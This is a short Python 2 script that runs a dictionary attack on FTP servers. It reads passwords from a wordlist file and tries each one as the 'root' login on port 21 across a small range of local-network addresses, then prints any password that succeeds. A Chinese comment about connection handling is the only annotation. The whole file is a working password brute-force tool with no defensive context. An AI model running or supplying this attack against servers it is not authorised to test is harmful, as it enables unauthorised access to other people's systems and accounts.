from ftplib import FTP

def dict(ip):
	f = open('/root/dict.txt','r')
	fpasswd = f.readlines()
	for passwd in fpasswd:
		vsftp(ip,passwd.strip())

def vsftp(ip,passwd):
	ftp=FTP()
	try:
		ftp.connect(ip,21,1)	
		ftp.login('root',passwd)
		print ip,'connect ok and','password:'+str(passwd),'ok'
		ftp.quit()
	except:
		print ip,'connect down or',passwd,'error'  #不要在except后写quit，因为本来就没有连接再写会将代码循环弹出

if __name__ == '__main__':
	for i in range(129,132):
		ip='192.168.1.'+str(i)
		dict(ip)
